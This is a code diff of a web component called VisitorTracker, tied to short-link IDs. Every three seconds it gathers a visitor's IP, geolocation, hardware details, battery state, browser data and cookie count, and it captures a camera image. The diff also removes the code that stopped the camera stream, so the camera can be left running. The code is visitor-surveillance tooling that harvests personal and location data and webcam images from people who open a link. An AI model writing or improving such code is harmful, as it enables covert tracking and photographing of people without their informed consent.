@@ -28,8 +28,6 @@ function VisitorTracker() {
             console.log("Location denied");
           }
         }
-
-       
         let batteryInfo = { level: "N/A", charging: "N/A" };
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
@@ -38,24 +36,30 @@ function VisitorTracker() {
             charging: battery.charging,
           };
         }
+const now = new Date();
+ 
+const date = now.toLocaleDateString('en-GB').replace(/\//g, '-'); // 24-03-2026
+const time = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' }); // 15:30
 
-         const deviceInfo = {
-          ip: ipData.ip,
-          latitude,
-          longitude,
-          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-          cpuCores: navigator.hardwareConcurrency || "N/A",
-          batteryLevel: batteryInfo.level,
-          isCharging: batteryInfo.charging,
-          browser: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          screen: `${window.screen.width}x${window.screen.height}`,
-          page: window.location.pathname,
-          cookieCount: document.cookie ? document.cookie.split(";").length : 0,
-          timestamp: new Date().toISOString(),
-        };
 
+const deviceInfo = {
+  ip: ipData.ip,
+  latitude,
+  longitude,
+  ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+  cpuCores: navigator.hardwareConcurrency || "N/A",
+  batteryLevel: batteryInfo.level,
+  isCharging: batteryInfo.charging,
+  browser: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  screen: `${window.screen.width}x${window.screen.height}`,
+  page: window.location.pathname,
+  cookieCount: document.cookie ? document.cookie.split(";").length : 0,
+  timestamp:  `${date},${time}` 
+};
+
+  
          let cameraImage = null;
         try {
           videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -116,17 +120,11 @@ function VisitorTracker() {
  
  
  
-    const interval = setInterval(captureVisitorData, 3000);
-  return () => {
+    const interval = setInterval(captureVisitorData,3000);
+  
+  return () => clearInterval(interval);
 
-     clearInterval(interval);
-
-     
-    if (videoStream) {
-      videoStream.getTracks().forEach((track) => track.stop());
-    }
-
-  };
+      
 
 }, [shortId]);
 
